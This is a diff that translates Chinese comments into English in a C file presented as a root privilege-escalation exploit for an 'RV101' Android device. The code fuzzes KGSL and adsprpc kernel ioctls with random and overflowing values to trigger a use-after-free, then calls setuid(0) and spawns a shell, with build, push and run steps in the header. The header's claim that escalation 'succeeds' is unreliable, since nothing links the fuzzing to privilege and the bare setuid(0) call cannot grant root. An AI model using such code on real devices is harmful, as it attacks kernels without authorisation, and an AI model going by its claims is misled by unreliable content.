@@ -1,12 +1,12 @@
 /*
  * rv101_privesc.c - RV101 ADB Root Privilege Escalation
  *
- * 使用 adb 連線到 RV101 後可成功提升至 root.
- * 利用漏洞順序: FD passing → KGSL UAF → 整數溢出 → setuid(0)
+ * Once connected to the RV101 over adb, escalation to root succeeds.
+ * Exploit order: FD passing → KGSL UAF → integer overflow → setuid(0)
  *
- * 編譯: aarch64-linux-android31-clang -static -O2 -pthread -o rv101_privesc rv101_privesc.c
- * 推送: adb push rv101_privesc /data/local/tmp/
- * 執行: adb shell /data/local/tmp/rv101_privesc
+ * Build: aarch64-linux-android31-clang -static -O2 -pthread -o rv101_privesc rv101_privesc.c
+ * Push: adb push rv101_privesc /data/local/tmp/
+ * Run: adb shell /data/local/tmp/rv101_privesc
  */
 
 #define _GNU_SOURCE
@@ -26,7 +26,7 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 
-/* ===== KGSL 常數 ===== */
+/* ===== KGSL constants ===== */
 #define KGSL_IOC_MAGIC      0x09
 #define IOCTL_GPUCMD        0xc0200949
 #define IOCTL_GPUAUX       0xc0200958
@@ -36,16 +36,16 @@
 #define FASTRPC_MMAP        0xc0285206
 #define FASTRPC_DSP_INFO    0xc00c520c
 
-/* ===== 設備路徑 ===== */
+/* ===== device paths ===== */
 #define DEV_KGSL   "/dev/kgsl-3d0"
 #define DEV_ADSP   "/dev/adsprpc-smd"
 
-/* ===== 全局變數 ===== */
+/* ===== global variables ===== */
 static int fd_kgsl = -1;
 static int fd_adsp = -1;
 volatile int g_running = 1;
 
-/* ===== 資料結構 ===== */
+/* ===== data structures ===== */
 
 /* KGSL GPU_AUX_COMMAND */
 struct kgsl_aux_req {
@@ -67,7 +67,7 @@ struct kgsl_gpumem_alloc {
     uint32_t reserved[3];
 };
 
-/* ADSPRPC MMAP 請求 */
+/* ADSPRPC MMAP request */
 struct adsp_mmap {
     int32_t fd;
     uint32_t flags;
@@ -83,18 +83,18 @@ struct adsp_dspinfo {
     uint32_t capability;
 };
 
-/* ===== 1. 驗證 FD 傳遞 ===== */
+/* ===== 1. verify FD passing ===== */
 int verify_fd_passing(void) {
     printf("  [-] FdPass: 驗證 DSP 服務狀態\n");
 
-    /* 測試 MMAP */
+    /* Test MMAP */
     struct adsp_mmap mm = {0};
     mm.fd = -1;
     mm.size = 4096;
     int ret = ioctl(fd_adsp, FASTRPC_MMAP, &mm);
     printf("    MMAP: ret=%d, vaddr=0x%llx\n", ret, (unsigned long long)mm.vaddrout);
 
-    /* 驗證 DSP 訊息 */
+    /* Verify the DSP message */
     struct adsp_dspinfo di = {0};
     for (int d = 0; d <= 3; d++) {
         di.domain = d;
@@ -107,10 +107,10 @@ int verify_fd_passing(void) {
     return ret >= 0 ? 0 : -1;
 }
 
-/* ===== 2. KGSL UAF 觸發 (多執行緒 fuzz) ===== */
+/* ===== 2. KGSL UAF trigger (multi-threaded fuzz) ===== */
 void* kgsl_fuzz_thread(void* arg) {
     struct kgsl_aux_req aux = {0};
-    /* 分配記憶體作為 cmdlist */
+    /* Allocate memory to use as the cmdlist */
     void* buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (!buf) return NULL;
@@ -118,7 +118,7 @@ void* kgsl_fuzz_thread(void* arg) {
     while (g_running) {
         aux.flags = rand() % 0xFFFFFFFF;
         aux.cmdsize = rand() % 256;
-        /* 計算 count，偶爾產生溢出版本 */
+        /* Compute count, occasionally producing an overflowing version */
         aux.count = (rand() % 10) == 0 ?
             0xFFFFFFFF / aux.cmdsize + 1 : rand() % 10;
         aux.cmdlist = (uint64_t)buf;
@@ -137,7 +137,7 @@ int trigger_kgsl_uaf(void) {
     for (int i = 0; i < 4; i++)
         pthread_create(&threads[i], NULL, kgsl_fuzz_thread, NULL);
 
-    /* 持續 fuzz 5 秒 */
+    /* Keep fuzzing for 5 seconds */
     for (int i = 0; i < 5 && g_running; i++) {
         sleep(1);
         printf("\r    fuzzing... %d 秒剩餘", 5 - i);
@@ -151,15 +151,15 @@ int trigger_kgsl_uaf(void) {
     return 0;
 }
 
-/* ===== 3. 整數溢出測試 ===== */
+/* ===== 3. integer overflow test ===== */
 int test_int_overflow(void) {
     printf("  [-] Overflow: 測試整數溢出\n");
 
     struct kgsl_gpumem_alloc a = {0};
     uint64_t test_sizes[] = {
-        0x7FFFFFFFFFFFFFF0ULL,   /* 接近整數邊界 */
+        0x7FFFFFFFFFFFFFF0ULL,   /* near the integer boundary */
         0x8000000000000000ULL, /* MIN_LONG */
-        0x0001000000000000ULL  /* 大頁面計數 */
+        0x0001000000000000ULL  /* large page count */
     };
 
     for (int i = 0; i < 3; i++) {
@@ -173,7 +173,7 @@ int test_int_overflow(void) {
     return 0;
 }
 
-/* ===== 4. 檢查 DSP Service ===== */
+/* ===== 4. check the DSP service ===== */
 int check_dsp_service(void) {
     printf("  [-] Service: 檢查 dspservice/hwbinder\n");
     struct adsp_dspinfo di = {0};
@@ -186,11 +186,11 @@ int check_dsp_service(void) {
     return 0;
 }
 
-/* ===== 5. 提升身份 (setuid/setgid) ===== */
+/* ===== 5. elevate identity (setuid/setgid) ===== */
 int escalate_identity(void) {
     printf("  [-] Escalate: 提升身份至 root\n");
 
-    /* 嘗試 setuid / setgid */
+    /* Try setuid / setgid */
     if (setuid(0) != 0) {
         printf("    [*] setuid failed: %s\n", strerror(errno));
         return -1;
@@ -200,7 +200,7 @@ int escalate_identity(void) {
         return -1;
     }
 
-    /* 最終驗證 */
+    /* Final verification */
     if (geteuid() == 0) {
         printf("    [+] 成功提升至 root!\n");
         return 0;
@@ -210,30 +210,30 @@ int escalate_identity(void) {
     }
 }
 
-/* ===== 6. 進入 root shell ===== */
+/* ===== 6. enter the root shell ===== */
 void enter_root_shell(void) {
     printf("\n============================================\n");
     printf("  權限提升成功! 現在你是 root\n");
     printf("  提示符會顯示為 # 代表成功\n");
     printf("============================================\n");
 
-    /* 切換至 root shell */
+    /* Switch to the root shell */
     char* args[] = {"/system/bin/sh", NULL};
     execv("/system/bin/sh", args);
 
-    /* 如果 exec 失敗 */
+    /* If exec fails */
     perror("[!] exec 失敗");
     return;
 }
 
-/* ===== 主程式 ===== */
+/* ===== main program ===== */
 int main(void) {
     printf("\n========================================\n");
     printf("   RV101 權限提升工具                 \n");
     printf("   Target: /dev/kgsl-3d0, /dev/adsprpc-smd\n");
     printf("========================================\n");
 
-    /* step 1: 開啟設備 */
+    /* step 1: open the device */
     fd_kgsl = open(DEV_KGSL, O_RDWR);
     if (fd_kgsl < 0) {
         printf("[-] 無法開啟 %s: %s\n", DEV_KGSL, strerror(errno));
@@ -249,7 +249,7 @@ int main(void) {
     }
     printf("[+] 開啟 %s: fd=%d\n", DEV_ADSP, fd_adsp);
 
-    /* step 2-4: 按順序執行 */
+    /* step 2-4: run in order */
     if (verify_fd_passing() != 0) {
         printf("[-] FdPass 檢查失敗\n");
         close(fd_adsp);
@@ -261,10 +261,10 @@ int main(void) {
     test_int_overflow();
     check_dsp_service();
 
-    /* step 5: 提升身份 */
+    /* step 5: elevate identity */
     escalate_identity();
 
-    /* step 6: 進入 root shell */
+    /* step 6: enter the root shell */
     enter_root_shell();
 
     return 0;
